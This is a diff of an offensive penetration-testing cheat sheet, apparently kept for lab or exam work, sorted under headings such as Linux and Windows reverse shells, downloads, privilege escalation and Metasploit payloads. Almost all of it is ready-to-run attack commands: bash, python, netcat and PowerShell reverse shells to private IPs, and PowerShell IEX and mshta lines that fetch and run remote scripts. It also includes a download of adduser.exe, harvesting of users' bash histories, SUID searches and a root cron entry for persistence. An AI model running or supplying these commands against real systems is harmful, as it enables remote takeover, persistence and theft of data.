@@ -1,4 +1,4 @@
-FUZZ .txt .zip .php !!!
+=== Linux Reverse shell command ===
 
 bash -i >& /dev/tcp/192.168.119.128/443 0>&1
 
@@ -7,21 +7,59 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 mkfifo t1;cat t1 | /bin/bash -I 2>&1 | nc 192.168.119.128 443 > t1
 
 
+=== Linux spawn tty shell ===
 python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+=== Linux Search interesting file ===
 
 find / -perm -u=s -type f 2>/dev/null
 find / -type f -perm -ug=rwx 2>/dev/null
 
+find / -type f -name "*.log" | xargs grep "ERROR"
+
+cat /home/*/.bash_history
+
+
+=== Linux crontab format ===
+*/5 * * * * root /var/www/html/1.sh
+
+
+=== Windows reverse shell ===
+!! if use samba share. Remember give all files 777 privileges !!
+
+powershell IEX (New-Object System.net.WebClient).DownloadString('http://192.168.23.131/mini-reverse.ps1')
+# mini-reverse.ps1 here: https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.23.131',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+mshta \\192.168.23.131\myshare\1.hta
+
+# powershell IEX(IWR http://192.168.23.131/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.23.131 443
+#Invoke-ConPtyShell here: https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
+
+To spawn a tty shell. The best way it to execute a nc.exe
+
+
+=== Windows download ===
 cscript wget.vbs http://xxxx xxxx
 
-find / -type f -name "*.log" | xargs grep "ERROR"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.92.131/adduser.exe', 'adduser.exe')
+
+upload a wget program.
+
+
+=== Windows Privileges Escap ===
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester
+
+=== msf payload ===
+windows/shell_reverse_tcp
+linux/x86/shell_reverse_tcp
+
 
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 
 Get-WmiObject win32_service | Select-Object PathName
-
-
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.92.131/adduser.exe', 'adduser.exe')
 
 
 wmic service where caption="Apache" get name,startmode
